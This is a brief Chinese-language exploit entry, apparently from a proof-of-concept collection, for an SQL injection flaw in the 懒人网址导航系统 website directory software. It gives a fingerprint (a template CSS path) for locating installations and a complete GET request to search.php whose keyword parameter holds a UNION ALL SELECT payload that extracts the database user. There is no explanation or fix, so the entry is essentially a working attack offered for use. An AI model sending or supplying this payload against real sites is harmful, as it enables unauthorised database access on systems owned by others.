# 懒人网址导航系统sql注入漏洞

懒人网址导航系统 ｜ SQL注入 ｜ —
- **指纹**：`"./templates/antidote/css/style.css"`
- **请求**：`GET /search.php?keyword=' UNION ALL SELECT CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Bypass HTTP/1.1`